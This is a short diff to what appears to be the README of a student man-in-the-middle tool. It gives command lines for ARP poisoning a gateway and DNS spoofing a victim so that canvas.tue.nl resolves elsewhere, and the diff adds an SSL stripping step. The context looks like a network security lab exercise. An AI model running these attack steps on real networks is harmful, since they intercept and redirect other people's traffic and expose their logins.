@@ -25,3 +25,4 @@ Clear ARP table: `sudo ip -s -s neigh flush all`
 
 2. ARP poison the gateway: `sudo python3 main.py --interface "enp0s10" arpPoison --ipVictim "192.168.1.1" --ipToSpoof "10.0.123.5"`
 3. DNS Spoof the victim: `sudo python3 main.py --interface "enp0s10" dnsSpoof --ipVictim "10.0.123.5" --ipToSpoof "46.137.139.112"` _canvas.tue.nl_
+4. SSL Strip the victim: `sudo python3 main.py --interface "enp0s10" sslStrip --ipVictim "10.0.123.5" --ipToSpoof "46.137.139.112"` _canvas.tue.nl_
